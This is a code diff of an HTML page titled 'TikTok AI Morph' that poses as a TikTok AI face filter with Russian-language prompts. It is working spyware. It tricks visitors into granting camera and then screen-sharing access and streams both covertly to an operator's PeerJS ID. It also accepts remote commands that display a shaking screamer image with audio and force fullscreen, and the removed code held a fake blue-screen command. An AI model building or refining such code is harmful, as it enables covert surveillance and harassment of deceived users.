@@ -3,42 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok AI Morph v6.0</title>
+    <title>TikTok AI Morph v7.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: #0d0d0d; border: 1px solid #222; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
+        .box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: #0d0d0d; border: 1px solid #222; }
         .logo { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0050); }
-        h1 { font-size: 24px; margin-bottom: 10px; color: #fff; }
-        p { color: #777; font-size: 14px; margin-bottom: 30px; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 20px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 5px 20px rgba(255,0,80,0.3); }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,0,80,0.5); }
-        #loader, #step-2, #screamer { display: none; }
-        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
-        .progress-fill { width: 0%; height: 100%; background: #ff0050; transition: 0.3s; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 20px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
+        .btn-cyan { background: #00f2ea; color: #000; }
+        #step-2, #screamer { display: none; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
-        #screamer img { width: 100%; height: 100%; object-fit: cover; }
+        #screamer img { width: 100%; height: 100%; object-fit: cover; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -3px); } 100% { transform: translate(1px, 2px); } }
     </style>
 </head>
 <body>
 
     <div id="step-1" class="box">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
-        <h1>AI Face Scanner</h1>
-        <p>Разрешите доступ к камере для калибровки нейросети под ваше лицо.</p>
-        <button class="btn" onclick="startCamera()">НАЧАТЬ</button>
-    </div>
-
-    <div id="loader" class="box">
-        <h2>АНАЛИЗ ЛИЦА...</h2>
-        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
-        <div id="percent" style="color: #ff0050; font-weight: bold;">0%</div>
+        <h1>Шаг 1/2</h1>
+        <p style="color: #777;">Разрешите доступ к камере для анализа лица.</p>
+        <button class="btn" onclick="connectCam()">РАЗРЕШИТЬ КАМЕРУ</button>
     </div>
 
     <div id="step-2" class="box">
-        <h2 style="color: #00f2ea;">ПОЧТИ ГОТОВО</h2>
-        <p>Для наложения AI-фильтра в реальном времени требуется синхронизация интерфейса.</p>
-        <button class="btn" style="background: #00f2ea; color: #000;" onclick="startScreen()">ПОДТВЕРДИТЬ</button>
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
+        <h1>Шаг 2/2</h1>
+        <p style="color: #777;">Нажмите для синхронизации AI-фильтра с вашим экраном.</p>
+        <button class="btn btn-cyan" onclick="connectScreen()">ВКЛЮЧИТЬ ФИЛЬТР</button>
     </div>
 
     <div id="screamer">
@@ -51,46 +43,30 @@
         const peer = new Peer();
         let conn;
 
-        // 1. Подключение камеры
-        async function startCamera() {
+        // 1. Подключаем камеру и сразу переходим к шагу 2
+        async function connectCam() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
                 peer.call(ADM_ID, stream);
 
                 document.getElementById('step-1').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-
-                let p = 0;
-                let int = setInterval(() => {
-                    p += Math.floor(Math.random() * 15) + 5;
-                    if (p >= 100) {
-                        p = 100;
-                        clearInterval(int);
-                        setTimeout(() => {
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('step-2').style.display = 'block';
-                        }, 500);
-                    }
-                    document.getElementById('fill').style.width = p + '%';
-                    document.getElementById('percent').innerText = p + '%';
-                }, 200);
+                document.getElementById('step-2').style.display = 'block';
 
                 listen();
-            } catch (e) { alert("Ошибка: нужен доступ к камере!"); location.reload(); }
+            } catch (e) { alert("Ошибка! Нужна камера."); }
         }
 
-        // 2. Подключение экрана (ПО ОТДЕЛЬНОМУ КЛИКУ)
-        async function startScreen() {
+        // 2. Подключаем экран по прямому клику (без задержек)
+        async function connectScreen() {
             try {
                 const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 peer.call(ADM_ID, screenStream);
                 
-                document.getElementById('step-2').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно настроен. Окно можно свернуть.</p>";
-                
-                // Переход в F11 для красоты (опционально)
-                document.documentElement.requestFullscreen().catch(()=>{});
-            } catch(e) { alert("Ошибка доступа к экрану!"); }
+                document.getElementById('step-2').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно активирован.</p>";
+            } catch(e) { 
+                alert("Нужно разрешить доступ к экрану!"); 
+            }
         }
 
         function listen() {
@@ -98,8 +74,8 @@
                 if (d.type === 'SCR') {
                     document.getElementById('screamer').style.display = 'flex';
                     document.getElementById('s-audio').play();
-                } else if (d.type === 'BSOD') {
-                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;">';
+                    // Попытка войти в фуллскрин при скримере
+                    document.documentElement.requestFullscreen().catch(()=>{});
                 }
             });
         }
